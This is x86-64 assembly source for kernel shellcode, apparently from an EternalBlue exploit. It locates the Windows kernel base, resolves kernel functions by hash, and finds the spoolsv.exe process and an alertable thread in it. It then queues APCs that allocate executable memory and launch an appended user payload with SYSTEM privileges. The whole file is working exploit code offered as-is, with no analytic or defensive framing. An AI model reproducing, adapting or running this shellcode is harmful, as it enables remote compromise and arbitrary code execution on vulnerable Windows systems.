;kernel_shellcode.asm

; function and offset resolution shellcode by sleepya EternalBlue exploit


; shellcode data section offsets

OFFSET_PEB_ADDR          EQU 0x0
OFFSET_KAPC              EQU 0x8
OFFSET_KAPC2             EQU 0x60
OFFSET_SC_BASE_ADDR      EQU 0xC8
OFFSET_HALPINTERRCONT    EQU 0xD0
OFFSET_PHALPAPICREQ      EQU 0xD8
OFFSET_NTENTRY           EQU 0xE0
OFFSET_USERPAYLOAD       EQU 0xE8

; some hardcoded EPROCESS and ETHREAD field offsets. I think they're consistent on Win10?
OFFSET_EPROCTHREADLIST   EQU 0x30
OFFSET_ETHREADTHREADLIST EQU 0x2F8
OFFSET_ETHREADMISCFLAGS  EQU 0x74
OFFSET_MISCFLALTERTABLE  EQU 0x4

; peb offsets

OFFSET_PEB_LDR           EQU 0x18
OFFSET_PEB_INMEMORDER    EQU 0x20

; hashes to resolve function pointers
HASH_PSGETCURRPROC       EQU 0xDBF47C78
HASH_PSGETPROCIMAGENAME  EQU 0x77645F3F
HASH_PSGETPROCID         EQU 0x170114E1
HASH_PSGETPROCPEB        EQU 0xB818B848
HASH_KEINITIALIZEAPC     EQU 0x6D195CC4
HASH_KEINSERTQUEUEAPC    EQU 0xAFCC4634
HASH_ZWALLOCVIRTMEM      EQU 0x576E99EA
HASH_CREATETHREAD        EQU 0x835E515E
HASH_SPOOLSV             EQU 0x3EE083D8

; size of usermode APC shellcode

USER_SHELLCODE_SIZE      EQU _data_addr - _user_shellcode

[SECTION .text]

global _start

_main:

_prologue:
    push r8
    push r9
    push r13
    push r15
    push r14
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi
    lea r14, [rel _data_addr]

_patch_back_hal_table:
    mov qword rax, [r14 + OFFSET_HALPINTERRCONT]
    mov qword rbx, [r14 + OFFSET_PHALPAPICREQ]
    mov [rax], qword rbx
    sti
    mov rax, [r14 + OFFSET_NTENTRY]

_find_nt_base:
    sub rax, 0x1000
    cmp word [rax], 0x5a4d
    jne _find_nt_base
    
    mov r15, rax
    mov [r14 + OFFSET_NTENTRY], r15

_get_current_eprocess:
    mov edi, HASH_PSGETCURRPROC
    call _call_nt_func
    mov r13, rax

_get_image_name_eprocess:
    mov edi, HASH_PSGETPROCIMAGENAME
    call _get_offset_from_function
    mov rcx, rax

_get_proc_links_eprocess:
    mov edi, HASH_PSGETPROCID
    call _get_offset_from_function
    mov rdx, rax
    add rdx, 0x8

_find_target_process_loop:
    lea rsi, [r13+rcx]
    call calc_hash
    cmp eax, HASH_SPOOLSV
    je _found_target_process
    mov r13, [r13+rdx]
    sub r13, rdx
    jmp _find_target_process_loop

_found_target_process:
    mov edi, HASH_PSGETPROCPEB
    mov rcx, r13
    call _call_nt_func
    mov [r14 + OFFSET_PEB_ADDR], rax

    mov r9, [r13 + OFFSET_EPROCTHREADLIST]
    mov r8, [r13 + OFFSET_EPROCTHREADLIST + 0x8]
    sub r8, OFFSET_ETHREADTHREADLIST
    xor rsi, rsi

_find_good_thread:
    sub r9, OFFSET_ETHREADTHREADLIST
    mov edi, dword [r9 + OFFSET_ETHREADMISCFLAGS]
    bt edi, OFFSET_MISCFLALTERTABLE
    jnc _find_good_thread_loop
    mov rsi, r9
    jmp _init_apc

_find_good_thread_loop:
    cmp r8, r9
    mov r9, [r9 + OFFSET_ETHREADTHREADLIST]
    jne _find_good_thread

_init_apc:
    test rsi, rsi
    jz _restore_regs_and_jmp_back
    lea rcx, [r14 + OFFSET_KAPC]
    mov rdx, rsi
    xor r8, r8
    lea r9, [rel _kernel_apc_routine]
    push rdx
    push r8
    push r8
    push r8
    mov edi, HASH_KEINITIALIZEAPC
    sub rsp, 0x20
    call _call_nt_func
    add rsp, 0x40

_insert_apc:
    lea rcx, [r14 + OFFSET_KAPC]
    mov edi, HASH_KEINSERTQUEUEAPC
    sub rsp, 0x20
    call _call_nt_func
    add rsp, 0x20

_restore_regs_and_jmp_back:
    cli
    mov rax, rbx
    pop rdi
    pop rsi
    pop rbx
    pop rdx
    pop rcx
    pop r14
    pop r15
    pop r13
    pop r9
    pop r8
    jmp rax

_call_nt_func:
    call _get_proc_addr
    jmp rax

_get_proc_addr:
    ; Save registers
    push rbx
    push rcx
    push rsi                ; for using calc_hash

    ; use rax to find EAT
    mov eax, dword [r15+60]  ; Get PE header e_lfanew
    add rax, r15
    mov eax, dword [rax+136] ; Get export tables RVA

    add rax, r15
    push rax                 ; save EAT

    mov ecx, dword [rax+24]  ; NumberOfFunctions
    mov ebx, dword [rax+32]  ; FunctionNames
    add rbx, r15

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
    add rsi, r15                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    pop rax                     ; restore EAT
    mov ebx, dword [rax+36]
    add rbx, r15                ; ordinate table virtual address
    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
    mov ebx, dword [rax+28]     ; Get the function addresses table rva
    add rbx, r15                ; Add the modules base address
    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
    add rax, r15                ; Add the modules base address to get the functions actual VA

    pop rsi
    pop rcx
    pop rbx
    ret

calc_hash:
    push rdx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop rdx
    ret

_get_offset_from_function:
    call _get_proc_addr
    cmp byte [rax+2], 0x80
    ja _get_offset_dword
    movzx eax, byte [rax+3]
    ret
_get_offset_dword:
    mov eax, dword [rax+3]
    ret

_kernel_apc_routine:
    push r15
    push r14
    push rdi
    push rsi

_find_createthread_addr:
    mov rax, [rel _data_addr + OFFSET_PEB_ADDR]
    mov rcx, [rax + OFFSET_PEB_LDR]
    mov rcx, [rcx + OFFSET_PEB_INMEMORDER]

_find_kernel32_dll_loop:
    mov rcx, [rcx]  
    cmp word [rcx+0x48], 0x18
    jne _find_kernel32_dll_loop
    
    mov rax, [rcx+0x50]
    cmp dword [rax+0xc], 0x00320033
    jnz _find_kernel32_dll_loop

    mov r15, [rcx + 0x20]
    mov edi, HASH_CREATETHREAD
    call _get_proc_addr
    mov r14, rax

_alloc_mem:
    mov r15, [rel _data_addr + OFFSET_NTENTRY]
    xor eax, eax
    mov cr8, rax
    lea rdx, [rel _data_addr + OFFSET_SC_BASE_ADDR]
    mov ecx, eax
    not rcx
    mov r8, rax
    mov al, 0x40
    push rax
    shl eax, 6
    push rax
    mov [r9], rax
    sub rsp, 0x20
    mov edi, HASH_ZWALLOCVIRTMEM
    call _call_nt_func
    add rsp, 0x30

_copy_user_shellcode:
    mov rdi, [rel _data_addr + OFFSET_SC_BASE_ADDR]
    lea rsi, [rel _user_shellcode]
    mov ecx, USER_SHELLCODE_SIZE
    rep movsb

_copy_user_payload:
    lea rsi, [rel _data_addr + OFFSET_USERPAYLOAD]
    mov ecx, 0x258
    rep movsb

_init_and_insert_apc:
    lea rcx, [rel _data_addr + OFFSET_KAPC2]
    mov rdx, qword [gs:0x188]
    xor r8, r8
    lea r9, [rel _kernel_apc_routine2]
    push r8
    push 0x1
    mov rax, [rel _data_addr + OFFSET_SC_BASE_ADDR]
    push rax
    push r8
    sub rsp, 0x20
    mov edi, HASH_KEINITIALIZEAPC
    call _call_nt_func
    add rsp, 0x40

    lea rcx, [rel _data_addr + OFFSET_KAPC2]
    mov rdx, r14
    xor r9, r9
    mov edi, HASH_KEINSERTQUEUEAPC
    sub rsp, 0x20
    call _call_nt_func
    add rsp, 0x20

_kernel_apc_done:
    pop rsi
    pop rdi
    pop r14
    pop r15
    ret

_kernel_apc_routine2:
    nop
    ret

_user_shellcode:
    xchg rdx, rax
    xor ecx, ecx
    push rcx
    push rcx
    mov r9, rcx
    lea r8, [rel _data_addr] ; user payload has been appended to bottom of this shellcode
    mov edx, ecx
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret

_data_addr:
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    db 'XXXXXXXX'
    dq 0

